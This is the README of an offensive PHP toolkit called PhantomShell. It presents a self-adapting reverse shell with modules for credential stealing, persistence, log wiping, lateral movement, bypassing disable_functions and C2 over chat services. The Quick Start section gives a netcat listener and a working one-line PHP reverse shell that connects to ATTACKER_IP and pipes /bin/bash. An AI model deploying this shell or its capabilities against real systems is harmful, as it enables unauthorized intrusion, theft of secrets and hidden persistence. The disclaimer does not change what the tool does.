# PhantomShell 🔮

[![PHP 5.6+](https://img.shields.io/badge/PHP-5.6%2B-777BB4?logo=php)](https://php.net)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-4.0-blue.svg)]()
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey)]()

**Self-Adaptive PHP Reverse Shell** — automatically detects server capabilities and adapts between 3 operating modes.

> ⚠️ **For authorized penetration testing, CTF competitions, and security research only.**

---

## Features

| Category | Commands | Description |
|----------|----------|-------------|
| **Core Shell** | `help`, `cd`, `pwd`, `clear`, `history`, `pty`, `alias` | Interactive shell with arrow keys, tab completion, history |
| **File Ops** | `cat`, `head`, `tail`, `ls`, `upload`, `download`, `edit` | Full file management with base64 transfer |
| **Recon** | `sysinfo`, `env`, `services`, `ports`, `firewall`, `netmap` | Deep system reconnaissance |
| **Vuln Scanner** | `vuln_scan` | Kernel CVEs, SUID/GTFOBins, sudo, docker, polkit, caps |
| **Exploits** | `exploit_suggest`, `exploit_fetch`, `exploit_compile` | Auto-suggest + fetch + compile kernel exploits |
| **Privesc** | `privesc_check`, `privesc_auto`, `privesc_suggest` | Automated privilege escalation checks |
| **Pivoting** | `pivot_portfwd`, `pivot_socks`, `pivot_tunnel`, + 6 more | TCP forwarding, SOCKS4 proxy, tool guides |
| **Network** | `portscan`, `connect`, `listen`, `bannergrab` | Port scanning, raw TCP, banner grabbing |
| **Persistence** | `persist_all`, `persist_cron`, `persist_ssh`, + 7 more | 10 persistence methods (cron, systemd, SSH, rc, motd...) |
| **Evasion** | `clean_logs`, `clean_self`, `hide_process`, `timestomp` | Anti-forensics and log cleaning |
| **Lateral** | `lateral_ssh`, `lateral_scp`, `lateral_wmi`, `lateral_smb` | Move between machines |
| **Stealing** | `steal_all`, `steal_configs`, `steal_ssh`, + 4 more | Credential and secret harvesting |
| **Backdoors** | `backdoor_php`, `backdoor_python`, `backdoor_bash`, + 3 more | Deploy persistent access |
| **C2** | `c2_discord`, `c2_telegram`, `c2_http`, `c2_sliver`, + 3 more | Command & control integration |
| **Exfil** | `exfil`, `compress` | Data exfiltration with gzip+base64 |
| **Automation** | `auto_root`, `auto_pivot`, `auto_persist`, `auto_clean`, `auto_report` | One-command operations |
| **Jobs** | `background`, `fg`, `jobs`, `kill` | Background process management |

## 3 Adaptive Modes

```
┌──────────────────────────────────────────────────┐
│  Server Capabilities Auto-Detection              │
│                                                  │
│  ┌─ Memory > 32MB ─┐                            │
│  ├─ Exec available  ├─► FULL MODE (100+ cmds)   │
│  ├─ Disk writable   │                            │
│  └─ No restrictions ┘                            │
│                                                  │
│  ┌─ Limited memory ─┐                            │
│  ├─ Exec available  ├─► NORMAL MODE (basic)      │
│  └─ Some limits     ┘                            │
│                                                  │
│  ┌─ No exec methods ┐                            │
│  └─ Restricted env  ┘─► MINIMAL MODE (stager)    │
└──────────────────────────────────────────────────┘
```

- **FULL**: All 100+ commands, pivoting suite, C2 integration
- **NORMAL**: Basic shell, file ops, recon, port scanning
- **MINIMAL**: Loader/stager, module fetching, PHP eval, self-upgrade

## Quick Start

### Listener (Attacker)
```bash
nc -lvnp 4444
```

### Deploy (Target)
```bash
# One-liner
php -r '$s=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$x);'

# Full shell
php phantom.php

# Minimal loader
php loader.php
```

### Module Server (for MINIMAL mode)
```bash
cd PhantomShell/
python3 -m http.server 8888
```

## Installation

```bash
git clone https://github.com/OmonovSarvar/PhantomShell.git
cd PhantomShell

# Edit config in phantom.php
# Change: $CFG['host'] and $CFG['port']
```

## Configuration

Edit the `$CFG` array at the top of `phantom.php`:

```php
$CFG = array(
    'host'      => '0.0.0.0',      // Your attacker IP
    'port'      => 4444,            // Listener port
    'http_port' => 8888,            // Module server port
    'reconnect' => 5,               // Reconnect delay (seconds)
    'timeout'   => 30,              // Connection timeout
);
```

Or use the standalone `config.php` for external configuration.

## Architecture

```
PhantomShell/
├── phantom.php          # FULL mode (100+ commands, auto-adaptive)
├── normal.php           # NORMAL mode (standalone)
├── loader.php           # MINIMAL mode (30-line stager)
├── config.php           # Shared configuration
├── modules/             # Loadable modules (MINIMAL mode)
│   ├── privesc.php
│   ├── pivoting.php
│   ├── persistence.php
│   ├── lateral.php
│   ├── stealing.php
│   ├── evasion.php
│   ├── backdoor.php
│   ├── c2.php
│   └── automation.php
├── docs/                # Documentation
├── payloads/            # Ready-to-use payloads
└── examples/            # Docker test lab
```

## Execution Bypass

PhantomShell uses 8 methods to bypass `disable_functions`:

1. `proc_open` — Full duplex with stdin/stdout/stderr
2. `popen` — Unidirectional pipe
3. `exec` — Array output
4. `shell_exec` — String output
5. `system` — Direct output
6. `passthru` — Binary-safe output
7. `FFI` — PHP 7.4+ Foreign Function Interface
8. `mail() + putenv()` — LD_PRELOAD injection

## Pivoting Suite

| Command | Description |
|---------|-------------|
| `pivot_portfwd` | PHP-native TCP port forwarding |
| `pivot_socks` | PHP-native SOCKS4 proxy server |
| `pivot_tunnel` | Reverse tunnel |
| `pivot_ligolo` | Ligolo-ng setup guide |
| `pivot_chisel` | Chisel tunneling guide |
| `pivot_ssh` | SSH dynamic/local/remote forwarding |
| `pivot_rpivot` | rpivot setup |
| `pivot_earthworm` | EarthWorm SOCKS |
| `pivot_proxychain` | Generate proxychains config |

## Legal Disclaimer

This tool is provided for **authorized security testing** and **educational purposes only**. You must have explicit written permission before using this tool against any system you do not own. Unauthorized access to computer systems is illegal.

The author assumes no liability for misuse of this software.

## License

[MIT License](LICENSE)

## Author

**OmonovSarvar** — Penetration Tester

---

*Built for security professionals, by security professionals.*
